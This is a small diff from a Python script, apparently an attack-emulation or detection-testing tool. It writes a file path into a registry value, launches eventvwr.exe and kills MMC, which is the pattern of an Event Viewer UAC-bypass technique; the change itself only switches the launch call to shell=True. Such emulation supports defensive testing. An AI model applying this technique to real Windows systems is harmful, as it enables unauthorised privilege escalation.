@@ -31,7 +31,7 @@ def _winreg_operations(target_file: str):
     winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)
 
     log.info("Running event viewer")
-    _ = _common.execute_command(["c:\\windows\\system32\\eventvwr.exe"])
+    _ = _common.execute_command("c:\\windows\\system32\\eventvwr.exe", shell=True)
 
     time.sleep(3)
     log.info("Killing MMC")
